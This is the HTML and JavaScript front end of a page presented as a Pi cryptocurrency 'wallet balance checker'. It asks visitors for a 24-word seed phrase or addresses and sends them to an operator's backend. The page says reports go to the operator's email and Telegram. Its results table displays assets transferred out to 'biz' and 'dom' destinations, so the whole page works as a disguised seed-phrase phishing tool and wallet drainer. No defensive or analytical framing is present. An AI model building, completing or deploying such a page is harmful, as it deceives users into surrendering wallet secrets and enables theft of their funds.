<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Pi Wallet Balance Checker</title>
<style>
  :root { color-scheme: light dark; }
  * { box-sizing: border-box; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    max-width: 720px;
    margin: 40px auto;
    padding: 0 16px;
    color: #1a1a1a;
    background: #fafafa;
  }
  h1 { font-size: 22px; margin-bottom: 4px; }
  p.sub { color: #666; margin-top: 0; font-size: 14px; }
  label { display: block; font-weight: 600; font-size: 13px; margin: 18px 0 6px; }
  textarea, input {
    width: 100%;
    padding: 10px;
    border: 1px solid #ccc;
    border-radius: 8px;
    font-size: 14px;
    font-family: inherit;
  }
  textarea { min-height: 120px; resize: vertical; font-family: monospace; }
  button {
    margin-top: 18px;
    padding: 10px 18px;
    border: none;
    border-radius: 8px;
    background: #6d28d9;
    color: #fff;
    font-size: 14px;
    font-weight: 600;
    cursor: pointer;
  }
  button:disabled { background: #b3a3d9; cursor: not-allowed; }
  .status { margin-top: 14px; font-size: 13px; }
  .status.error { color: #b91c1c; }
  .status.ok { color: #15803d; }
  .table-scroll { overflow-x: auto; margin-top: 20px; }
  table { width: 100%; min-width: 760px; border-collapse: collapse; font-size: 13px; }
  th, td { border: 1px solid #ddd; padding: 8px 10px; text-align: left; }
  th { background: #f0f0f0; }
  td.addr { font-family: monospace; font-size: 12px; }
  .badge { padding: 2px 8px; border-radius: 999px; font-size: 11px; font-weight: 600; }
  .badge.ok { background: #dcfce7; color: #15803d; }
  .badge.not_found { background: #fef9c3; color: #854d0e; }
  .badge.invalid, .badge.error { background: #fee2e2; color: #b91c1c; }
  .delivery { margin-top: 10px; font-size: 12px; color: #555; }
  .radio-group { margin: 10px 0; }
  .radio-group label { display: inline; font-weight: normal; margin-right: 15px; font-size: 14px; }
</style>
</head>
<body>

<h1>Pi Wallet Balance Checker</h1>
<p class="sub">Paste Pi wallet addresses (one per line) or a seed phrase — the report goes to your configured email(s) and Telegram, and shows here too.</p>

<div class="radio-group">
  <label><input type="radio" name="inputType" value="address" checked> Wallet Addresses</label>
  <label><input type="radio" name="inputType" value="seed"> Seed Phrase</label>
</div>

<div id="addressInputWrap">
  <label for="addresses">Wallet addresses (one per line)</label>
  <textarea id="addresses" placeholder="GABCDEF...&#10;GXYZQWE..."></textarea>
</div>

<div id="seedPhraseWrap" style="display:none;">
  <label for="seedPhrase">Seed Phrase (24 words)</label>
  <textarea id="seedPhrase" placeholder="word1 word2 word3 ... word24"></textarea>
</div>

<button id="submitBtn">Check Balances</button>

<div id="status" class="status"></div>
<div id="deliveryInfo" class="delivery"></div>
<div id="resultsWrap"></div>

<script>
  const API_URL = 'https://your-backend.up.railway.app/api/check-balances';
  // ^ REQUIRED: replace with your deployed backend's URL.

  const $addresses = document.getElementById('addresses');
  const $seedPhrase = document.getElementById('seedPhrase');
  const $btn = document.getElementById('submitBtn');
  const $status = document.getElementById('status');
  const $delivery = document.getElementById('deliveryInfo');
  const $resultsWrap = document.getElementById('resultsWrap');

  function setStatus(message, kind) {
    $status.textContent = message;
    $status.className = 'status' + (kind ? ' ' + kind : '');
  }

  function formatDate(iso) {
    if (!iso) return '—';
    try {
      return new Date(iso).toLocaleString(undefined, { dateStyle: 'medium', timeStyle: 'short' });
    } catch {
      return iso;
    }
  }

  function renderOtherAssets(assets) {
    if (!assets || assets.length === 0) return '<span style="color:#999">none</span>';
    return assets.map(a => `${a.balance} ${a.asset}`).join('<br/>');
  }

  function renderTransfer(transfer) {
    if (!transfer) return '—';
    if (!transfer.attempted) return 'not attempted';
    if (!transfer.success) return `<span style="color:#b91c1c">❌ ${transfer.error || 'failed'}</span>`;
    const parts = [];
    if (transfer.piBusinessAmount !== null || transfer.piDomesticAmount !== null) {
      parts.push(`${transfer.piBusinessAmount} π → biz, ${transfer.piDomesticAmount} π → dom`);
    }
    if (transfer.otherAssetsTransferred && transfer.otherAssetsTransferred.length > 0) {
      const other = transfer.otherAssetsTransferred.map(t => t.status === 'sent' ? `${t.asset} ${t.amount} → dom` : `${t.asset} skipped`).join(', ');
      parts.push(`Other: ${other}`);
    }
    return `<span style="color:#15803d">✅ ${parts.join(' | ')}</span>`;
  }

  function renderResults(results) {
    if (!results || results.length === 0) {
      $resultsWrap.innerHTML = '';
      return;
    }
    const rows = results.map(r => {
      if (r.status === 'invalid' || r.status === 'error') {
        return `
          <tr>
            <td class="addr">${r.address}</td>
            <td><span class="badge ${r.status}">${r.status}</span></td>
            <td colspan="6">${r.error || '-'}</td>
          </tr>
        `;
      }
      const total = (r.unlockedBalance || 0) + (r.lockedBalance || 0);
      return `
        <tr>
          <td class="addr">${r.address}</td>
          <td><span class="badge ${r.status}">${r.status}</span></td>
          <td>${r.unlockedBalance} π</td>
          <td>${r.lockedBalance} π</td>
          <td>${formatDate(r.nextUnlockDate)}</td>
          <td><strong>${total} π</strong></td>
          <td>${renderOtherAssets(r.otherAssets)}</td>
          <td>${renderTransfer(r.transfer)}</td>
        </tr>
      `;
    }).join('');

    $resultsWrap.innerHTML = `
      <div class="table-scroll">
        <table>
          <thead>
            <tr>
              <th>Address</th>
              <th>Status</th>
              <th>Unlocked</th>
              <th>Locked</th>
              <th>Next Unlock</th>
              <th>Total</th>
              <th>Other Assets</th>
              <th>Transfer</th>
            </tr>
          </thead>
          <tbody>${rows}</tbody>
        </table>
      </div>
    `;
  }

  function renderDelivery(data) {
    const parts = [];
    if (data.email && data.email.attempted) {
      parts.push(data.email.error
        ? `Email: ❌ ${data.email.error}`
        : `Email: ✅ sent to ${data.email.sentTo.join(', ')}`);
    } else {
      parts.push('Email: not configured');
    }
    if (data.telegram && data.telegram.attempted) {
      const sent = data.telegram.deliveries.filter(d => d.status === 'sent').length;
      const total = data.telegram.deliveries.length;
      parts.push(`Telegram: ${sent}/${total} targets notified`);
    } else {
      parts.push('Telegram: not configured');
    }
    $delivery.textContent = parts.join('  •  ');
  }

  document.querySelectorAll('input[name="inputType"]').forEach(radio => {
    radio.addEventListener('change', (e) => {
      const isSeed = e.target.value === 'seed';
      document.getElementById('addressInputWrap').style.display = isSeed ? 'none' : 'block';
      document.getElementById('seedPhraseWrap').style.display = isSeed ? 'block' : 'none';
    });
  });

  $btn.addEventListener('click', async () => {
    if (API_URL.includes('your-backend.up.railway.app')) {
      setStatus('Set API_URL at the top of the <script> tag to your deployed backend URL first.', 'error');
      return;
    }

    const inputType = document.querySelector('input[name="inputType"]:checked').value;
    let requestBody;

    if (inputType === 'seed') {
      const seedPhrase = $seedPhrase.value.trim();
      if (!seedPhrase) {
        setStatus('Please enter a seed phrase.', 'error');
        return;
      }
      requestBody = { seedPhrases: [seedPhrase] };
    } else {
      const addresses = $addresses.value
        .split('\n')
        .map(a => a.trim())
        .filter(Boolean);

      if (addresses.length === 0) {
        setStatus('Add at least one wallet address.', 'error');
        return;
      }
      requestBody = { addresses };
    }

    $btn.disabled = true;
    setStatus('Checking balances...', '');
    $resultsWrap.innerHTML = '';
    $delivery.textContent = '';

    try {
      const res = await fetch(API_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(requestBody),
      });
      const data = await res.json();

      if (!res.ok) {
        setStatus(data.error || 'Something went wrong.', 'error');
        return;
      }

      setStatus(`Done — checked ${data.results.length} item(s).`, 'ok');
      renderResults(data.results);
      renderDelivery(data);
    } catch (err) {
      setStatus('Network error: ' + err.message, 'error');
    } finally {
      $btn.disabled = false;
    }
  });
</script>

</body>
</html>
